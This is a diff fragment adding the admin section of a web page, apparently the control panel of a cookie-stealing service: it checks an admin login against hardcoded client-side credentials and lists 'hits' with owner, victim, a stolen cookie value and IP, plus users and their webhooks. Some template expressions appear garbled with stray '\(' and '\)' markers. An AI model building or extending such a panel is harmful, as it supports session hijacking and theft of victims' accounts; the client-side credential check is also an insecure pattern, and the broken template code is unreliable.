+  document.getElementById("adminModal").classList.remove("hidden");
+  document.getElementById("admErr").textContent="";
+});
+function tryAdminLogin(){
+  const u=document.getElementById("admUser").value, p=document.getElementById("admPass").value;
+  if(u===ADMIN_USER&&p===ADMIN_PASS){
+    document.getElementById("adminModal").classList.add("hidden");
+    document.getElementById("sidebar").classList.add("hidden");
+    document.getElementById("mainApp").classList.add("hidden");
+    document.getElementById("adminApp").classList.remove("hidden");
+    renderAdmin();
+  } else document.getElementById("admErr").textContent="Invalid.";
+}
+function adminLogout(){
+  document.getElementById("adminApp").classList.add("hidden");
+  document.getElementById("sidebar").classList.remove("hidden");
+  document.getElementById("mainApp").classList.remove("hidden");
+}
+function renderAdmin(){
+  document.getElementById("admHits").textContent=globalHits.length;
+  document.getElementById("admUsers").textContent=Object.keys(users).length;
+  document.getElementById("admHitsBody").innerHTML=globalHits.length?globalHits.map(h=>`
+    <tr><td>\( {new Date(h.time).toLocaleString()}</td><td> \){h.owner}</td><td>${h.victim}</td>
+    <td style="font-family:monospace;font-size:.78rem">\( {h.cookie.slice(0,30)}…</td><td> \){h.ip}</td></tr>`).join("")
+    :`<tr><td colspan="5" style="color:var(--muted);text-align:center;padding:16px">No hits</td></tr>`;
+  document.getElementById("admUsersBody").innerHTML=Object.keys(users).length?Object.entries(users).map(([n,u])=>`
+    <tr><td>\( {n}</td><td style="font-size:.8rem;max-width:200px;overflow:hidden;text-overflow:ellipsis"> \){u.webhook||u.profile?.webhook||"—"}</td>
+    <td>${(u.hits||[]).length}</td></tr>`).join("")
+    :`<tr><td colspan="3" style="color:var(--muted);text-align:center;padding:16px">No users</td></tr>`;
+}
+</script>
+</body>
+</html>
